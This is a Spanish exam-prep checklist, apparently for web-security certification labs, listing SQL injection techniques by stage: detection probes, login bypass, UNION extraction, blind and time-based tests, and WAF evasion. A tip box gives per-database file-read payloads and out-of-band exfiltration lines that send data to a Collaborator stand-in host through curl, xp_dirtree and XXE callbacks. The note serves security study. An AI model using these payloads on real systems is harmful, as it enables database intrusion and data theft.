---
aliases:
  - to-do SQLi
tags:
  - exam/to-do
  - vuln/sql-injection
---

# SQL Injection — Qué probar

> Técnica → [[vulnerabilities/001-sql-injection/README|entry point]] · labs → [[vulnerabilities/001-sql-injection/labs/README|labs]] · [[vulnerabilities/001-sql-injection/cheat-sheet|cheat sheet]] · ofuscación → [[vulnerabilities/019-obfuscacion/README|obfuscacion]]

## 🚩 Flags

> [!danger] 🚩 ¿Está?
> - **Stage 1:** cookie **`TrackingId`** → casi seguro SQLi (suele ser **blind**).
> - **Stage 2/3:** hay **search/buscador** o cualquier input que consulte la BD.
> - Puntos: buscador, `?category=`, login (`username`), filtros, cookies, headers. Probá `'` · `''` · `OR 1=1`.

## 🎯 Por stage

| Aspecto | 🟢 Stage 1 | 🟠 Stage 2 | 🔴 Stage 3 |
| --- | --- | --- | --- |
| **Objetivo** | entrar a una cuenta | escalar a admin | leer `/home/carlos/secret` |
| **Cómo** | bypass login (`administrator'--`) o extraer credenciales | **UNION** saca user+pass del admin; o **UPDATE/stacked** sube tu `roleId` | **lectura de fichero por motor** o exfil OOB / SSRF-in-SQL a `localhost:6566` |

## ♾️ Independiente del stage

- [ ] **Detección:** `'` → error/cambio; `''` normaliza; `OR 1=1`.
- [ ] **In-band:** `?category=` → WHERE / **UNION** (nº de columnas → columna texto → datos de otras tablas).
- [ ] **Login bypass:** `administrator'--`.
- [ ] **Blind:** condicional (respuesta true/false), **error-based**, **time-based** (`SLEEP`/`pg_sleep`/`WAITFOR`), o **OOB** si no refleja.
- [ ] **WAF:** filter bypass con ofuscación (XML encoding en el stock-check, comentarios, case).

> [!tip] 💡 Lectura de fichero por motor (Stage 3 → el secreto)
> - **MySQL:** `LOAD_FILE('/home/carlos/secret')` (requiere `secure_file_priv` permisivo).
> - **PostgreSQL:** `pg_read_file('/home/carlos/secret')` · `COPY ... TO PROGRAM 'curl http://COLLAB/?x=...'` (superuser).
> - **MSSQL:** `OPENROWSET(BULK '...', SINGLE_CLOB)` → exfil por `xp_dirtree '\\datos.COLLAB\x'`.
> - **Oracle:** es **XXE-in-SQL** (`extractvalue(xmltype(...SYSTEM "http://...COLLAB/"...))`) → callback con datos en el subdominio. Ver [[vulnerabilities/006-xxe/xxe|XXE]].
> - Contenido grande → trocear con `SUBSTR`+hex y reconstruir desde el Collaborator. **Primero fingerprint del DBMS.**

## 🔗 Referencias
- [[vulnerabilities/001-sql-injection/README|entry point]] · [[vulnerabilities/001-sql-injection/labs/README|labs]] · [[vulnerabilities/001-sql-injection/cheat-sheet|cheat sheet]] · [[vulnerabilities/019-obfuscacion/README|ofuscación]] · SSRF interno → [[vulnerabilities/007-ssrf/ssrf|SSRF]]
